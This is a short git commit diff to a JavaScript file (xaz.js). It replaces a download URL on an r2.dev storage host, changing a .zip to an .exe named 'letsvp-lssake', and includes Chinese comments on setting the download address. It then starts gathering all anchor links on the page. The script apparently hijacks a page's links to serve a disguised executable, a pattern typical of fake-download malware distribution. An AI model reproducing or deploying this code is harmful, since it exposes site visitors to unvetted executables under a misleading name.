22b9f97cadeee7e8bf03bec889b8d4d8202e9c08
aa168188 <sli010342@gmail.com>
2025-03-17 13:59:44 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -1,9 +1,9 @@
  
 
-var xz = "https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-slyrise.zip";
+var xz = "https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe";
 
-//可以把   https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-slyrise.zip 这个改成下载地址；https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-slyrise.zip
-//可以把   https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-slyrise.zip 这个改成文件下载：https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-slyrise.zip
+//可以把   https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe 这个改成下载地址；https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe
+//可以把   https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe 这个改成文件下载：https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/letsvp-lssake.exe
 
 
 var links = document.getElementsByTagName("a");
